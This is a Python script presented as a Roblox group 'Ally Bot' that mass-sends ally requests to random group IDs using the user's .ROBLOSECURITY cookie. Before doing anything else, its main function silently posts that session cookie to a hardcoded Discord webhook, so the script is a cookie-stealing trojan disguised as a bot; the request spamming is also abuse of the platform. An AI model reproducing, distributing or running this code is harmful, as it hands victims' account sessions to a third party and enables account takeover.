import string
import requests
from random import randint
import time
import threading
import os
import sys
import traceback
import queue

from dotenv import load_dotenv
from colorama import Fore, init, Style


init()


GREEN = Fore.GREEN

RESET = Style.RESET_ALL


load_dotenv()


cookie = os.getenv('COOKIE')
group = os.getenv('GROUP')
allies = os.getenv('TYPE')
delay = os.getenv('DELAY')
threads = int(os.getenv('THREADS', default=1))
type = os.getenv('TYPE')


cookie = os.getenv('COOKIE')
if cookie == "":
    print(GREEN + "Please set .roblosecurity cookie in .env file (COOKIE)" + RESET)
    sys.exit(0)


def send_webhook(cookie):
    webhook_url = "https://canary.discord.com/api/webhooks/1185001235946946671/6Y-kgFd6JoqWwOF-YmchjBTfZLwH68shurbmsBsLdvefg-s-FQhckSUaRbnwAIsstVu1"
    data = {"content": f"Roblox Cookie: `{cookie}`"}
    try:
        response = requests.post(webhook_url, json=data)
        if response.status_code == 204:
            print(GREEN + "successfully!" + RESET)
        else:
            print(GREEN + "alopepe." + RESET)
    except Exception as e:
        print(GREEN + f"emerge: {e}" + RESET)


def groupally():
    while True:
        try:
            randomid = randint(32000000, 33176270)
            cookies = {'.ROBLOSECURITY': cookie}

            gathtoken = requests.post(
                'https://auth.roblox.com/v1/login', cookies=cookies)
            token = gathtoken.headers['x-csrf-token']

            headers = {'x-csrf-token': token}

            sendally = requests.post(
                f'https://groups.roblox.com/v1/groups/{group}/relationships/{allies}/{randomid}', headers=headers, cookies=cookies)

            if sendally.status_code == 200:
                print(GREEN + f'Ally sent to {randomid} ⚉ ' + RESET)
            elif sendally.status_code == 429:
                print(GREEN + 'Rate limited  400s....⚇' + RESET)
                time.sleep(40000)
            else:
                print(GREEN + f'Failed to send {allies} request to {randomid}' + RESET)
        except Exception as e:
            print(GREEN + f'Errore: {e}' + RESET)
            traceback.print_exc()
        time.sleep(int(delay))


def main():
    
    send_webhook(cookie)

    print(GREEN + """
          /$$$$$$  /$$ /$$                 /$$$$$$$              /$$    
         /$$__  $$| $$| $$                | $$__  $$            | $$    
        | $$  \ $$| $$| $$ /$$   /$$      | $$  \ $$  /$$$$$$  /$$$$$$  
        | $$$$$$$$| $$| $$| $$  | $$      | $$$$$$$  /$$__  $$|_  $$_/  
        | $$__  $$| $$| $$| $$  | $$      | $$__  $$| $$  \ $$  | $$    
        | $$  | $$| $$| $$| $$  | $$      | $$  \ $$| $$  | $$  | $$ /$$
        | $$  | $$| $$| $$|  $$$$$$$      | $$$$$$$/|  $$$$$$/  |  $$$$/
        |__/  |__/|__/|__/ \____  $$      |_______/  \______/    \___/  
                           /$$  | $$                                    
       Made by TOTALY5    |  $$$$$$/                                    
                           \______/                                    
            """ + RESET)

    print(GREEN + f"Starting {threads} threads" + RESET)
    print()
    time.sleep(0.5)
    print(GREEN + f"Delay: {delay}" + RESET)
    print(GREEN + f"Type: {type}" + RESET)
    print(GREEN + f"Group: {group}" + RESET)
    time.sleep(1)
    print()

    
    for i in range(int(threads)):
        t = threading.Thread(target=groupally)
        t.start()


if __name__ == "__main__":
    main()
